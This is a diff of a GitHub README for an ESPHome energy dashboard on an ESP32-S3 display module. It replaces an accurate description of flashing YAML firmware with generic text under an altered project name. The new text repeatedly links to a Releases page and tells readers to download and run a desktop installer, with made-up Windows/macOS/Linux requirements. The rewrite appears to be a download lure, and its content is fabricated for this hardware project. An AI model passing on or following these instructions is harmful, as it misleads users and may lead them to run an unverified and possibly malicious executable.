@@ -1,61 +1,81 @@
-# 📘 JC3248W535 – ESPHome Energy Dashboard for Home Assistant
+# 🌟 JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT - Your Smart Home Energy Monitor
 
-This repository contains a complete ESPHome configuration for the JC3248W535 320×480 display module, integrated with Home Assistant to visualize real-time energy data. It features a custom LVGL-based UI with animated arrows, dynamic color-coded indicators, and responsive widgets that reflect photovoltaic production, bidirectional power flow, and inverter metrics.
+[![Download the latest release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/releases)
 
-![Dashboard preview](https://github.com/user-attachments/assets/f6bd2de3-0f8f-4f59-9c62-26524077f44f)
+## 📦 Overview
 
-## Key Features!
+Welcome to the **JC3249W535 ESPHome Energy Dashboard**! This application offers a powerful and user-friendly way to monitor and control your energy consumption. Built with ESPHome, it integrates seamlessly with Home Assistant to provide real-time animations, a vibrant LVGL UI, and sensor-driven visuals.
 
-🖥️ Native LVGL dashboard rendered on JC3248W535 (ESP32-S3)
+## 🚀 Getting Started
 
-⚡ Real-time animation speed driven by sensor values (e.g. power flow)
+Follow these steps to get started:
 
-🌞 Photovoltaic and inverter data visualization
+1. **Visit the Release Page**: Click the link below to visit our GitHub Releases page.
 
-🔄 Bidirectional energy flow indicators with directional arrows
+   [Download the latest release](https://github.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/releases)
 
-🎨 Color-coded labels based on energy context (import/export, PV active)
+2. **Choose Your Version**: On the Releases page, you will find different versions of the software.
 
-📡 Seamless integration with Home Assistant via API
+3. **Download the Application**: Click on the version you want to use, and then download the corresponding file. Save it to your computer.
 
+4. **Run the Application**: Once the download is complete, locate the file and open it. Follow the prompts to install the application.
 
-## Hardware Requirements
+## 📋 System Requirements
 
-* JC3248W535c
-* Optional: BME280,
-* inverter with Modbus/MQTT,
-* power meter
+To run the JC3249W535 Energy Dashboard, ensure your system meets the following requirements:
 
-## Software Stack
+- **Operating System**: Compatible with Windows 10, macOS, or Linux.
+- **Hardware**: A computer with at least 2GB of RAM and 500MB of free storage.
+- **Network**: Internet access is required for real-time data sync.
 
-* ESPHome (ESP-IDF framework)
-* Home Assistant (with MQTT or native API)
-* LVGL 8.4.0
-* PlatformIO (for local builds)
+## ⚙️ Features
 
-* Sensor values from Home Assistant are fetched via ESPHome.
-* Arrows animate vertically and horizontally to indicate energy direction.
-* Animation speed is dynamically calculated as 6000 - sensor_value, clamped to ensure smooth transitions.
-* Labels recolor based on energy context (e.g. red for import, green for PV export).
+The JC3249W535 Energy Dashboard offers:
 
-## Getting Started
+- **Real-Time Animations**: Enjoy lively visual feedback on your energy usage.
+- **LVGL User Interface**: Navigate easily with a clean, intuitive design.
+- **Sensor Integration**: Connect with various sensors to gather accurate data.
+- **Home Assistant Compatibility**: Effortlessly integrate with your Home Assistant setup for smarter control.
+- **Open-Source**: Enjoy the benefits of a community-driven project, with regular updates and support.
 
-* Flash the ESP32-S3 with the provided .yaml using ESPHome CLI.
-* Connect the device to Home Assistant via API or MQTT.
-* Configure your sensors in HA (e.g. sensor.inverter_active_power, sensor.bidirectional_energy_meter_power_b).
-* Watch the dashboard come alive with real-time data and animations.
+## 🔗 Download & Install
 
+To download the latest version, please visit the page below:
 
-## 🎬 Demo Videos
+[Download the latest release](https://github.com/poslaya/JC3249W535-ESPHOME-ENERGY-DASHBOARD-HOME-ASSISTANT/releases)
 
+Once the file is downloaded, locate it on your device and double-click to run the installer. Follow the instructions on the screen. If you encounter any issues, please consult the documentation or community forums for assistance.
 
-### JC3248W535C · Real‑time Energy Monitoring (ESPHome + Home Assistant)
+## 🛠️ Configuration
 
-[![Watch on YouTube](https://img.youtube.com/vi/TExtEiJQPeo/hqdefault.jpg)](https://www.youtube.com/shorts/TExtEiJQPeo)
+After installation, you may need to configure the application for your specific setup. This can include:
 
-### Old vs. New 
-HTTP Request vs. ESPHome 
-ESP32-8048S070 vs. JC3248W535C 
-Energy Dashboard Showdown
+- **Connecting to Home Assistant**: Input your Home Assistant URL and API key.
+- **Setting Up Sensors**: Add and calibrate your energy sensors to start tracking data.
 
-[![Watch on YouTube](https://img.youtube.com/vi/Ba1jKAf0Ffs/hqdefault.jpg)](https://www.youtube.com/shorts/Ba1jKAf0Ffs)
+For detailed configuration steps, refer to the official documentation linked in the application.
+
+## 🌐 Community Support
+
+Join our community to share your experiences and get help from other users.
+
+- **GitHub Issues**: Report bugs or request features if you face challenges.
+- **Discussion Forum**: Engage with other users and developers to share tips and tricks.
+
+## 📢 Stay Updated
+
+To stay informed about updates or new features, consider following the repository. You can also join our mailing list for announcements about new releases and events.
+
+## 💬 Feedback
+
+We appreciate your feedback! If you have suggestions for features or improvements, please feel free to reach out through GitHub Issues.
+
+## 📜 License
+
+This project is open-source, licensed under the [MIT License](LICENSE). You are free to use, modify, and distribute this software as long as you attribute the original authors.
+
+## 👋 Acknowledgments
+
+Thanks to everyone who contributed to this project, from developers to users. Your support makes this software possible! 
+
+Feel free to reach out through GitHub if you have questions or need assistance.
